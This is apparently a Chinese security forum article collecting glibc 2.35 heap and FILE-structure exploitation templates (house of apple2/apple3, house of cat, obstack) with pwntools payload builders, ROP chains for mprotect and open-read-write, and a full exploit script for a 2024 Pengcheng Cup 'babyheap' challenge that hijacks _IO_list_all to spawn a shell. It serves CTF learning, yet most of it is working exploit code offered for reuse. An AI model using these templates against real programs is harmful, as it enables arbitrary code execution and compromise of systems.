libc2.35时代IO利用模板总结
==================

文章中的利用方法主要针对libc2.35，高版本可做适当修改利用。话不多说，直接开始。

house of apple系列
----------------

libc2.35后的IO利用最知名的就是house of apple了，一共三个系列文章，是[roderick师傅](https://www.roderickchan.cn/zh-cn/)发现并广泛利用。

### house of apple2

基于**IO\_FILE-&gt;\_wide\_data**的利用技巧  
条件：

- 已知**heap**地址和**libc**地址
- 能控制程序**执行IO**操作，包括但不限于：从**main**函数返回、调用**exit**函数、通过`__malloc_assert`触发
- 能控制**vtable**和`_wide_data`，一般使用**largebin attack**去控制  
    利用`_IO_wfile_overflow`函数控制程序执行流：  
    调用链：**\_IO\_wfile\_overflow** -&gt; **\_IO\_wdoallocbuf** -&gt; **\_IO\_WDOALLOCATE**  
    **getshell模板**
    
    ```python
    def house_of_apple2(fake_IO_file_addr):
    fake_IO_file = flat(
        {
            0x18: 1,    # _IO_write_ptr
            0x58: one_gadget,   # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr,    # _IO_wide_data
            0xc8: _IO_wfile_jumps,  # vtable
            0xd0: fake_IO_file_addr,    # fake wide vtable
        }, filler='\x00'
    )
    
    return fake_IO_file
    ```

**ORW模板**

```python
def house_of_apple2(fake_IO_file_addr):
    fake_IO_file = flat(
        {
            0x18: 1,    # _IO_write_ptr
            0x58: setcontext + 61,   # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr + 0x100,    # _IO_wide_data
            0xc8: _IO_wfile_jumps,  # vtable
            0xf0: {
                0xa0: [fake_IO_file_addr + 0x200, ret],
                0xe0: fake_IO_file_addr
            },
            0x1f0: [
                pop_rdi_ret, fake_IO_file_addr >> 12 << 12,
                pop_rsi_ret, 0x2000,
                pop_rdx_rbx_ret, 7, 0,
                pop_rax_ret, 10,    # mprotect
                syscall_ret,
                fake_IO_file_addr + 0x290
            ],
            0x280: asm(shellcraft.cat('flag'))

        }, filler='\x00'
    )
    payload = fake_IO_file

    return payload
```

**注意：** 上述模板中fake\_IO\_file\_addr地址为伪造的\_IO\_FILE起始地址。

### house of apple3

基于**IO\_FILE-&gt;\_codecvt**的利用方法。  
条件：

- 已知**heap**地址和**libc**基址
- 能控制程序执行**IO**操作，包括但不限于：从**main**函数返回、调用**exit**函数、通过**\_\_malloc\_assert**触发
- 能控制**IO\_FILE**的**vtable**和**\_codecvt**，一般使用**largebin attack**去控制  
    利用`_IO_wfile_underflow`控制程序执行流  
    **调用链**：**\_IO\_wfile\_underflow** -&gt; **libio\_codecvt\_in** -&gt; **fp-&gt;codecvt -&gt; cd\_in.step -&gt; \_\_fct(函数指针)**

```php
_IO_wfile_underflow
    __libio_codecvt_in
        DL_CALL_FCT
            gs = fp->_codecvt->__cd_in.step
            *(gs->__fct)(gs)

```

**getshell模板**

```python
def house_of_apple3(fake_IO_file_addr):
    fake_ucontext = ucontext_t()
    fake_ucontext.rip = ret
    fake_ucontext.rsp = fake_IO_file_addr + 0x300
    fake_ucontext.rdi = fake_IO_file_addr >> 12 << 12
    fake_ucontext.rsi = 0x2000
    fake_ucontext.rdx = 7

    fake_IO_file = flat(
        {
            0: 0xffffffffffffffff,  # _IO_read_end
            0x18: 1,                # _IO_write_ptr
            0x30: fake_IO_file_addr + 0x100,    # _IO_buf_end = _codecvt.step
            0x88: fake_IO_file_addr + 0x40,     # _codecvt
            0x90: _IO_wide_data,
            0xc8: _IO_wfile_jumps + 0x8,        # vtable
            0xf0: {
                0: 0,   # key
                0x28: one_gadget,     # fun_ptr
            }
        }, filler='\x00'
    )

    payload = fake_IO_file
    return payload
```

**ORW模板**  
`magic gadget: libc2.36及以上版本被去除`

```python
# <getkeyserv_handle+576>
mov rdx, qword ptr [rdi + 8]; 
mov qword ptr [rsp], rax; 
call qword ptr [rdx + 0x20]
```

```python
def house_of_apple3(fake_IO_file_addr):
    frame = SigreturnFrame()
    frame.rip = ret
    frame.rsp = fake_IO_file_addr + 0x200
    frame.rdi = fake_IO_file_addr >> 12 << 12
    frame.rsi = 0x2000
    frame.rdx = 7

    fake_IO_file = flat(
        {
            0: 0xffffffffffffffff,  # _IO_read_end
            0x18: 1,                # _IO_write_ptr
            0x30: fake_IO_file_addr + 0x100,    # _IO_buf_end = _codecvt.step
            0x88: fake_IO_file_addr + 0x40,     # _codecvt
            0x90: _IO_wide_data,
            0xc8: _IO_wfile_jumps + 0x8,        # vtable
            0xf0: {
                0: 0,   # key
                0x8: fake_IO_file_addr + 0x100,
                0x20: setcontext + 61,
                0x28: magic_gadget,     # fun_ptr
                0x30: bytes(frame)[0x30:]
            },
            0x1f0: [
                pop_rax_ret, 10,
                syscall_ret,
                fake_IO_file_addr + 0x230
            ],
            0x220: asm(shellcraft.cat('flag'))
        }, filler='\x00'
    )

    payload = fake_IO_file
    return payload
```

可以结合国资社畜师傅提出的[house of 一骑当千](https://bbs.kanxue.com/thread-276056.htm)达到无条件ORW。

```python
class ucontext_t:
    '''
    [0x1c0] must be NULL.
    '''
    length = 0x1c8
    bin_str = length * b'\0'
    rip = 0
    rsp = 0
    rbx = 0
    rbp = 0
    r12 = 0
    r13 = 0
    r14 = 0
    r15 = 0
    rsi = 0
    rdi = 0
    rcx = 0
    r8 = 0
    r9 = 0
    rdx = 0

    def __init__(self):
        pass

    def set_value(self, offset, value):
        if(offset <= 0 or offset > self.length - 8):
            raise Exception("Out bound!")
        temp = self.bin_str
        temp = temp[:offset] + struct.pack('Q', value) + temp[offset + 8:]
        self.bin_str = temp

    def __bytes__(self):
        self.set_value(0x28, self.r8)
        self.set_value(0x30, self.r9)     
        self.set_value(0x48, self.r12)
        self.set_value(0x50, self.r13)
        self.set_value(0x58, self.r14)
        self.set_value(0x60, self.r15)
        self.set_value(0x68, self.rdi)
        self.set_value(0x70, self.rsi)
        self.set_value(0x78, self.rbp)
        self.set_value(0x80, self.rbx)
        self.set_value(0x88, self.rdx)
        self.set_value(0x98, self.rcx)
        self.set_value(0xa0, self.rsp)
        self.set_value(0xa8, self.rip)  # rip
        self.set_value(0xe0, self.rip)  # readable

        return self.bin_str

def house_of_apple3(fake_IO_file_addr):
    fake_ucontext = ucontext_t()
    fake_ucontext.rip = ret
    fake_ucontext.rsp = fake_IO_file_addr + 0x300
    fake_ucontext.rdi = fake_IO_file_addr >> 12 << 12
    fake_ucontext.rsi = 0x2000
    fake_ucontext.rdx = 7

    fake_IO_file = flat(
        {
            0: 0xffffffffffffffff,  # _IO_read_end
            0x18: 1,                # _IO_write_ptr
            0x30: fake_IO_file_addr + 0x100,    # _IO_buf_end = _codecvt.step
            0x88: fake_IO_file_addr + 0x40,     # _codecvt
            0x90: _IO_wide_data,
            0xc8: _IO_wfile_jumps + 0x8,        # vtable
            0xf0: {
                0: 0,   # key
                0x28: setcontext,     # fun_ptr
                0x30: bytes(fake_ucontext)[0x30:]
            },
            0x2f0: [
                pop_rax_ret, 10,
                syscall_ret,
                fake_IO_file_addr + 0x330
            ],
            0x320: asm(shellcraft.cat('flag'))
        }, filler='\x00'
    )

    payload = fake_IO_file
    return payload
```

house of cat
------------

本质上跟house of apple的思想一致，都是利用\_IO\_wide\_data这样一个结构体，只不过使用了不同的利用链。这个方法是由[catfly师傅](https://bbs.kanxue.com/thread-273895.htm)首次提出，并出了2022年强网杯同名赛题。  
**条件：**

- 能够任意写一个可控地址。
- 能够泄露堆地址和libc基址。
- 能够触发IO流（FSOP或触发\_\_malloc\_assert），执行IO相关函数。  
    **利用链：** **\_IO\_wfile\_seekoff** -&gt; **\_IO\_switch\_to\_wget\_mode**  
    调用链源码如下，只需要绕过下图圈出的限制条件，即可达到利用。  
    `_IO_wfile_seekof`  
    ![image-20230205004705966.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-972ae4f81cae7f92a1b80f61cd44510a7055fe31.png)

`_IO_switch_to_wget_mode`  
![image-20230205004944251.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7207c7189f3b09601208be40a5f73e57da009802.png)  
该函数利用了`_IO_WOVERFLOW` 这样一个宏，可以在gdb中查看汇编代码。

![image-20230205005206063.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d0e8b8427bc2801833c62c556030f4ab945c171f.png)

**getshell模板**

```python
def house_of_cat(fake_IO_file_addr):
    fake_IO_file = flat(
        {
            0x20: [
                0, 0,
                1, 1,
                fake_IO_file_addr,  # rdx
                system
            ],
            0x58: 0,    # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr + 0x30,     # _IO_wide_data
            0xb0: 1,    # _mode
            0xc8: _IO_wfile_jumps + 0x30,    # vtable _IO_wfile_seekoff
            0x100: fake_IO_file_addr + 0x40,    # fake_wide_jumps
        }
    )

    payload = fake_IO_file

    return payload
```

**ORW模板**  
ROP链方式

```python
def house_of_cat(fake_IO_file_addr):
    flag_addr = fake_IO_file_addr + 0x200
    data = fake_IO_file_addr + 0x400
    payload = flat(
        {
            0x20: [
                    0, 0, 
                    1, 1,
                    fake_IO_file_addr+0x150,    # rdx
                    setcontext + 61
                ],
            0x58: 0,    # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr + 0x30,  # _IO_wide_data
            0xb0: 1,    # _mode
            0xc8: _IO_wfile_jumps + 0x10,   # fake_IO_wide_jumps
            0x100: fake_IO_file_addr + 0x40,
            0x140: {
                0xa0: [fake_IO_file_addr + 0x210, ret]
            },
            0x1f0: 'flag',
            0x200: [
                pop_rax_ret,  # sys_open('flag', 0)
                2,
                pop_rdi_ret,
                flag_addr,
                pop_rsi_ret,
                0,
                syscall_ret,

                pop_rax_ret,  # sys_read(flag_fd, heap, 0x100)
                0,
                pop_rdi_ret,
                3,
                pop_rsi_ret,
                data,
                pop_rdx_rbx_ret,
                0x40, 0,
                syscall_ret,

                pop_rax_ret,  # sys_write(1, heap, 0x100)
                1,
                pop_rdi_ret,
                1,
                pop_rsi_ret,
                data,
                pop_rdx_rbx_ret,
                0x40, 0,
                syscall_ret
            ]
        }, filler='\x00'
    )

    return payload
```

Shellcode方式

```python
def house_of_cat(fake_IO_file_addr):
    payload = flat(
        {
            0x20: [
                    0, 0, 
                    1, 1,
                    fake_IO_file_addr+0x150,    # rdx
                    setcontext + 61
                ],
            0x58: 0,    # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr + 0x30,  # _IO_wide_data
            0xb0: 1,    # _mode
            0xc8: _IO_wfile_jumps + 0x30,   # fake_IO_wide_jumps
            0x100: fake_IO_file_addr + 0x40,
            0x140: {
                0xa0: [fake_IO_file_addr + 0x210, ret]
            },
            0x200: [
                pop_rdi_ret, fake_IO_file_addr >> 12 << 12,
                pop_rsi_ret, 0x1000,
                pop_rdx_rbx_ret, 7, 0,
                pop_rax_ret, 10,    # mprotect
                syscall_ret,
                fake_IO_file_addr+0x280+0x10,
            ],
            0x280: shellcode,
        }, filler='\x00'
    )

    return payload
```

obstack利用
---------

> 本文讨论obstack这条利用链在libc2.35的应用  
> libc2.37 去除`_IO_obstack_jumps`这个vtable，但是依然存在obstack这个结构体。  
> glibc-2.37开始这个方法的调用链为： `__printf_buffer_as_file_overflow` -&gt; `__printf_buffer_flush` -&gt; `__printf_buffer_flush_obstack` -&gt; `__obstack_newchunk`  
> 高版本利用方法也由[7resp4ss师傅](https://bbs.kanxue.com/thread-276471.htm)提出。

**条件：**  
1.任意写一个可控地址或劫持 `_IO_list_all`。(如`large bin attack`、`tcache stashing unlink attack`、`fastbin reverse into tcache`)  
2.能够触发`IO`流（`FSOP`或触发`__malloc_assert`，或者程序中存在`puts`等能进入`IO`链的函数），执行`IO`相关函数。  
3.能够泄露`堆地址`和`libc`基址。  
**调用链：** **\_IO\_obstack\_xsputn** -&gt; **\_obstack\_newchunk** -&gt; **CALL\_CHUNKFUN** -&gt; **chunkfun**

```php
_IO_obstack_xsputn
            obstack_grow
                _obstack_newchunk
                        CALL_CHUNKFUN(一个宏定义)
                        (*(h)->chunkfun)((h)->extra_arg, (size))
```

**关键结构体**

```c
struct _IO_obstack_file
{
  struct _IO_FILE_plus file;
  struct obstack *obstack;      // 0xe0
};

// 0x58
struct obstack {
    long chunk_size;    
    struct _obstack_chunk *chunk;
    char *object_base;
    char *next_free;    // offset = 0x18
    char *chunk_limit;  // offset = 0x20
    union {
        long tempint;
        void *tempptr;
    } temp;
    int alignment_mask;
    struct _obstack_chunk *(*chunkfun)(void *, long);   // offset = 0x38
    void (*freefun)(void *, struct _obstack_chunk *);
    void *extra_arg;    // offset = 0x48
    unsigned int use_extra_arg : 1;     // offset = 0x50
    unsigned int maybe_empty_object : 1;
    unsigned int alloc_failed : 1;
}

struct _obstack_chunk {
    char *limit;
    struct _obstack_chunk *prev;
    char contents[4];
}
```

**关键函数分析**

```c
#define obstack_grow(OBSTACK, where, length)                      \
  __extension__                                   \
    ({ struct obstack *__o = (OBSTACK);                       \
       int __len = (length);                              \
       if (_o->next_free + __len > __o->chunk_limit)                  \
     _obstack_newchunk (__o, __len);                      \
       memcpy (__o->next_free, where, __len);                     \
       __o->next_free += __len;                           \
       (void) 0; })

#define CALL_CHUNKFUN(h, size) \
  (((h)->use_extra_arg)                               \
   ? (*(h)->chunkfun)((h)->extra_arg, (size))                     \
   : (*(struct _obstack_chunk *(*)(long))(h)->chunkfun)((size)))

static _IO_size_t
_IO_obstack_xsputn (_IO_FILE *fp, const void *data, _IO_size_t n)
{
  struct obstack *obstack = ((struct _IO_obstack_file *) fp)->obstack;

  if (fp->_IO_write_ptr + n > fp->_IO_write_end)
    {
      int size;
      /* We need some more memory.  First shrink the buffer to the
     space we really currently need.  */
      obstack_blank_fast (obstack, fp->_IO_write_ptr - fp->_IO_write_end);

      /* Now grow for N bytes, and put the data there.  */
      obstack_grow (obstack, data, n);

      ...
}

void
_obstack_newchunk (struct obstack *h, int length)
{
  struct _obstack_chunk *old_chunk = h->chunk;
  struct _obstack_chunk *new_chunk;
  long new_size;
  long obj_size = h->next_free - h->object_base;
  long i;
  long already;
  char *object_base;

  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;

  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size);
  [...]
}
```

**fake\_IO满足条件如下：**

- 伪造\_IO\_FILE，并记为A
- `chunkA + 0xd8`设为`_IO_obstack_jumps+/-offset`，使得可以调用`_IO_obstack_xsputn`
- `chunkA + 0xe0`设为`obstack`结构体地址B
- `fp->_IO_write_ptr` &gt; `fp->_IO_write_end`，即 A + 0x28 &gt; A + 0x30
- `obstack -> next_free` &gt; `obstack->chunk_limit`，即 B + 0x18 &gt; B + 0x20
- `obstack->use_extra_arg != 0`，即 B + 0x50 != 0

**getshell模板**

```python
def house_of_obstack(fake_IO_file_addr):
    fake_IO_file = flat(
        {
            0x8: 1,     # next_free
            0x10: 0,    # chunk_limit
            0x18: 1,    # _IO_write_ptr 
            0x20: 0,    # _IO_write_end
            0x28: system,   # gadget
            0x38: fake_IO_file_addr + 0xe8,     # rdi = &'/bin/sh\x00'
            0x40: 1,
            0x58: 0,    # chain
            0x78: _IO_stdfile_2_lock,   # _IO_stdfile_1_lock
            0x90: _IO_wide_data,        # _IO_wide_data_2
            0xc8: _IO_obstack_jumps + 0x20,
            0xd0: fake_IO_file_addr,    # obstack(B)
            0xd8: '/bin/sh\x00'
        }, filler='\x00'
    )
    payload = fake_IO_file

    return payload
```

**ORW模板**

```python
def house_of_obstack(fake_IO_file_addr):
    flag_addr = fake_IO_file_addr + 0x300 
    data = fake_IO_file_addr + 0x380
    fake_IO_file = flat({
            0:{
                0x8: 1,     # next_free
                0x10: 0,    # chunk_limit
                0x18: 1,    # _IO_write_ptr 
                0x20: 0,    # _IO_write_end
                0x28: magic_gadget, # gadget
                0x38: fake_IO_file_addr + 0x100,        # rdi
                0x40: 1,
                0x58: 0,    # chain
                0x78: _IO_stdfile_2_lock,   # _IO_stdfile_1_lock
                0x90: _IO_wide_data,        # _IO_wide_data_2
                0xc8: _IO_obstack_jumps + 0x20,
                0xd0: fake_IO_file_addr     # obstack(B)
            }, 
            0xf0:{
                0: [
                    0,
                    fake_IO_file_addr + 0x100,
                    0,0,
                    setcontext + 61
                ],
                0xa0: fake_IO_file_addr + 0x200,
                0xa8: ret
            },
            0x1f0:
                [
                    pop_rax_ret,  # sys_open('flag', 0)
                    2,
                    pop_rdi_ret,
                    flag_addr,
                    pop_rsi_ret,
                    0,
                    syscall_ret,

                    pop_rax_ret,  # sys_read(flag_fd, heap, 0x100)
                    0,
                    pop_rdi_ret,
                    3,
                    pop_rsi_ret,
                    data,
                    pop_rdx_rbx_ret,
                    0x40,
                    0,
                    syscall_ret,

                    pop_rax_ret,  # sys_write(1, heap, 0x100)
                    1,
                    pop_rdi_ret,
                    1,
                    pop_rsi_ret,
                    data,
                    pop_rdx_rbx_ret,
                    0x40,
                    0,
                    syscall_ret
                ],
            0x2f0: 'flag\x00\x00\x00\x00',
        }, filler='\x00'
    )

    payload = fake_IO_file

    return payload
```

**结合house of 一骑当千**

```python
class ucontext_t:
    '''
    [0x1c0] must be NULL.
    '''
    length = 0x1c8
    bin_str = length * b'\0'
    rip = 0
    rsp = 0
    rbx = 0
    rbp = 0
    r12 = 0
    r13 = 0
    r14 = 0
    r15 = 0
    rsi = 0
    rdi = 0
    rcx = 0
    r8 = 0
    r9 = 0
    rdx = 0

    def __init__(self):
        pass

    def set_value(self, offset, value):
        if(offset <= 0 or offset > self.length - 8):
            raise Exception("Out bound!")
        temp = self.bin_str
        temp = temp[:offset] + struct.pack('Q', value) + temp[offset + 8:]
        self.bin_str = temp

    def __bytes__(self):
        self.set_value(0x28, self.r8)
        self.set_value(0x30, self.r9)     
        self.set_value(0x48, self.r12)
        self.set_value(0x50, self.r13)
        self.set_value(0x58, self.r14)
        self.set_value(0x60, self.r15)
        self.set_value(0x68, self.rdi)
        self.set_value(0x70, self.rsi)
        self.set_value(0x78, self.rbp)
        self.set_value(0x80, self.rbx)
        self.set_value(0x88, self.rdx)
        self.set_value(0x98, self.rcx)
        self.set_value(0xa0, self.rsp)
        self.set_value(0xa8, self.rip)  # rip
        self.set_value(0xe0, self.rip)  # readable

        return self.bin_str

def house_of_obstack(fake_IO_file_addr):
    flag_addr = fake_IO_file_addr + 0x400 
    data = fake_IO_file_addr + 0x410

    fake_ucontext = ucontext_t()
    fake_ucontext.rip = ret
    fake_ucontext.rsp = fake_IO_file_addr + 0x300

    ''' read
    fake_ucontext = ucontext_t()
    fake_ucontext.rip = syscall_ret
    fake_ucontext.rsp = fake_IO_file_addr + 0x4000
    fake_ucontext.rdi = 0
    fake_ucontext.rsi = fake_IO_file_addr + 0x4000
    fake_ucontext.rdx = 0x100
    '''

    fake_IO_file = flat({
            0:{
                0x8: 1,     # next_free
                0x10: 0,    # chunk_limit
                0x18: 1,    # _IO_write_ptr 
                0x20: 0,    # _IO_write_end
                0x28: setcontext,   # gadget
                0x38: fake_IO_file_addr + 0x100,        # rdi
                0x40: 1,
                0x58: 0,    # chain
                0x78: _IO_stdfile_2_lock,   # _IO_stdfile_1_lock
                0x90: _IO_wide_data,        # _IO_wide_data_2
                0xc8: _IO_obstack_jumps + 0x20,
                0xd0: fake_IO_file_addr     # obstack(B)
            }, 
            0xf0: bytes(fake_ucontext),
            0x2f0:
                [
                    pop_rax_ret,  # sys_open('flag', 0)
                    2,
                    pop_rdi_ret,
                    flag_addr,
                    pop_rsi_ret,
                    0,
                    syscall_ret,

                    pop_rax_ret,  # sys_read(flag_fd, heap, 0x100)
                    0,
                    pop_rdi_ret,
                    3,
                    pop_rsi_ret,
                    data,
                    pop_rdx_rbx_ret,
                    0x40,
                    0,
                    syscall_ret,

                    pop_rax_ret,  # sys_write(1, heap, 0x100)
                    1,
                    pop_rdi_ret,
                    1,
                    pop_rsi_ret,
                    data,
                    pop_rdx_rbx_ret,
                    0x40,
                    0,
                    syscall_ret
                ],
            0x3f0: 'flag\x00\x00\x00\x00',
        }, filler='\x00'
    )

    payload = fake_IO_file

    return payload
```

例题分析
----

### 2024鹏城杯 babyheap

edit函数给了一次机会的堆溢出。

![image-20241109180026973.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e955e473cd7dae5c5b9d7ab28185d41f7d6fa668.png)

布局堆风水泄露heap地址与libc地址。  
劫持\_IO\_list\_all，使用house of apple2的getshell模板一把嗦。

```python
from pwn import *
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)

context.arch = 'amd64'
context.log_level = 'debug'

fn = './pwn'
elf = ELF(fn)
libc = elf.libc

debug = 1
if debug:
    p = process(fn)
else:
    p = remote()

def dbg(s=''):
    if debug:
        gdb.attach(p, s)
        pause()

    else:
        pass

lg = lambda x, y: log.success(f'{x}: {hex(y)}')

def menu(index):
    p.sendlineafter('your choice:', str(index))

def add(index, size, content):
    menu(1)
    p.sendlineafter('input idx:', str(index))
    p.sendlineafter('input size:', str(size))
    p.sendafter('input content:', content)

def show(index):
    menu(3)
    p.sendlineafter('input idx:', str(index))

def edit(index, content):
    menu(4)
    p.sendlineafter('input idx:', str(index))
    p.send(content)

def delete(index):
    menu(2)
    p.sendlineafter('input idx:', str(index))

for i in range(12):
    add(i, 0x80, 'aaaa')

for i in range(7):
    delete(i)

delete(7)
delete(9)

add(0x14, 0x400, 'aaaa')

for i in range(7):
    add(0, 0x80, 'aaaa')

add(7, 0x80, 'aaaaaaaa')
show(7)

p.recvuntil('a' * 8)
heapbase = u64(p.recv(6).ljust(8, b'\x00')) - 0x7a0
lg('heapbase', heapbase)

add(0, 0x80, 'aaaa')

for i in range(10):
    add(i, 0x80, 'aaaa')

for i in range(7):
    delete(i)

delete(7)
add(0x14, 0x400, 'aaaa')

for i in range(7):
    add(0, 0x80, 'aaaa')

add(7, 0x80, 'aaaaaaaa')
show(7)

p.recvuntil('a' * 8)
libcbase = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ad60
lg('libcbase', libcbase)

def house_of_apple2(fake_IO_file_addr):
    fake_IO_file = flat(
        {
            0x18: 1,    # _IO_write_ptr
            0x58: one_gadget,   # chain
            0x78: _IO_stdfile_2_lock,   # _lock
            0x90: fake_IO_file_addr,    # _IO_wide_data
            0xc8: _IO_wfile_jumps,  # vtable
            0xd0: fake_IO_file_addr,    # fake wide vtable
        }, filler='\x00'
    )

    return fake_IO_file

_IO_list_all = libcbase + libc.sym['_IO_list_all']
_IO_wfile_jumps = libcbase + 0x2170c0
_IO_stdfile_2_lock = libcbase + 0x21ca80

gadgets = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]
one_gadget = libcbase + gadgets[0]

add(0, 0x80, 'aaaa')
add(1, 0x80, 'aaaa')
add(2, 0x80, 'aaaa')
add(3, 0x80, 'aaaa')

delete(2)
delete(1)

payload = flat(
    {
        0x80: [
            0, 0x91, _IO_list_all ^ ((heapbase + 0x1000) >> 12)
        ]
    }
)
edit(0, payload)

fake_IO_file_addr = heapbase + 0x1950
add(0x14, 0x400, house_of_apple2(fake_IO_file_addr))

add(0, 0x80, 'aaaa')
add(1, 0x80, p64(fake_IO_file_addr))

# dbg()

menu(1)
p.sendlineafter('input idx:', str(0x100))

p.interactive()
```

调试过程中利用链如图所示

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-435c4f4df71ef01ecf2d78571d829b30a28feea9.png)

最终直接getshell。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8d7f716f1df4c7af65d214e787032034da82c1f0.png)

总结
--

本文总结了高版本libc的getshell与ORW模板。各位大师傅们可以利用这些模板对这类赛题一把梭，还没有学到这部分的小白师傅们只需要会largebin attack等方法就可以对高版本libc实现一把梭。